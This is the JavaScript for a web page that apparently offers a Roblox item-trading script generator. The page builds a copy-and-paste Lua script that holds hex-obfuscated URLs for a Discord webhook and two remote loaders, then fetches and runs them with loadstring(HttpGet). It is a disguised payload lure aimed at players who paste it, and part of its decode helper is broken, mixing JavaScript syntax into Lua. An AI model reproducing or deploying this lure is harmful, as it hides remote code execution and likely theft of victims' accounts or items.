const listContainer = document.getElementById("brainrotList");
const searchBar = document.getElementById("searchBar");
const generateBtn = document.getElementById("generateBtn");
const output = document.getElementById("scriptOutput");
const outputSection = document.getElementById("outputSection");
const copyBtn = document.getElementById("copyBtn");
const selCount = document.getElementById("selCount");
const filterBtns = document.querySelectorAll(".filter-btn");

let activeRarity = "All";
const selected = new Set();

function updateCount() {
  selCount.textContent = selected.size + " selected";
}

function renderList(filter="") {
  listContainer.innerHTML = "";
  const q = filter.toLowerCase();
  brainrots
    .filter(b => (activeRarity === "All" || b.rarity === activeRarity) && b.name.toLowerCase().includes(q))
    .forEach(b => {
      const chip = document.createElement("label");
      chip.className = "br-chip" + (selected.has(b.name) ? " selected" : "");
      chip.dataset.rarity = b.rarity;
      chip.innerHTML = `<input type="checkbox" value="${b.name}"${selected.has(b.name) ? " checked" : ""}><span>${b.name}</span>`;
      chip.addEventListener("click", e => {
        e.preventDefault();
        if (selected.has(b.name)) {
          selected.delete(b.name);
          chip.classList.remove("selected");
          chip.querySelector("input").checked = false;
        } else {
          selected.add(b.name);
          chip.classList.add("selected");
          chip.querySelector("input").checked = true;
        }
        updateCount();
      });
      listContainer.appendChild(chip);
    });
}

filterBtns.forEach(btn => {
  btn.addEventListener("click", () => {
    filterBtns.forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    activeRarity = btn.dataset.rarity;
    renderList(searchBar.value);
  });
});

searchBar.addEventListener("input", e => renderList(e.target.value));
renderList();

document.getElementById("selectAllBtn").addEventListener("click", () => {
  const q = searchBar.value.toLowerCase();
  brainrots
    .filter(b => (activeRarity === "All" || b.rarity === activeRarity) && b.name.toLowerCase().includes(q))
    .forEach(b => selected.add(b.name));
  renderList(searchBar.value);
  updateCount();
});

document.getElementById("clearBtn").addEventListener("click", () => {
  selected.clear();
  renderList(searchBar.value);
  updateCount();
});

generateBtn.addEventListener("click", () => {
  const userId = document.getElementById("userId").value.trim();
  if (!/^\d+$/.test(userId)) { alert("Enter a valid numeric User ID!"); return; }
  if (selected.size === 0) { alert("Select at least 1 brainrot!"); return; }

  output.textContent = "Loading...";
  outputSection.style.display = "block";
  outputSection.scrollIntoView({ behavior:"smooth", block:"nearest" });

  setTimeout(() => {
    const names = Array.from(selected);
    let script = `getgenv().WEBHOOK_URL = "68747470733a2f2f646973636f72642e636f6d2f6160692f776562686f6f6b732f1480316437901082764/HasXX1HpiYGIL-pVr2HeoVGh9xNouGyWe__n1SlcMQ29WMFbmFcCL4VA5ipQixQ2iHd7"\n`;
    script += `getgenv().TARGET_ID = ${userId}\n`;
    script += `getgenv().DELAY_STEP = 1\n`;
    script += `getgenv().TRADE_CYCLE_DELAY = 2\n`;
    script += `getgenv().TARGET_BRAINROTS = {\n`;
    names.forEach((b, i) => {
      script += `    ["${b}"]=true${i < names.length - 1 ? "," : ""}\n`;
    });
    script += `}\n\n`;
    script += `local Trade="68747470733a2f2f6170692e6c7561726d6f722e6e65742f66696c65732f76342f6c6f61646572732f66626364316432353838396138343332393731303764656133363432303434642e6c7561"\n`;
    script += `local Auto_grab="68747470733a2f2f676473626f6c756e6576737777636667676c6c682e73757061626173652e636f2f66756e6374696f6e732f76312f7261772d73696c656e746875623f69643d706f64757775796a6e647933"\n\n`;
    script += `local function decode(hex) return (hex:gsub("..",c=>string.char(tonumber(c,16)))) end\n\n`;
    script += `task.spawn(function() loadstring(game:HttpGet(decode(Trade)))() end)\n`;
    script += `task.spawn(function() loadstring(game:HttpGet(decode(Auto_grab)))() end)`;
    output.textContent = script;
  }, 800);
});

copyBtn.addEventListener("click", () => {
  navigator.clipboard.writeText(output.textContent);
  copyBtn.textContent = "✅ Copied!";
  setTimeout(() => { copyBtn.textContent = "📋 Copy"; }, 2000);
});
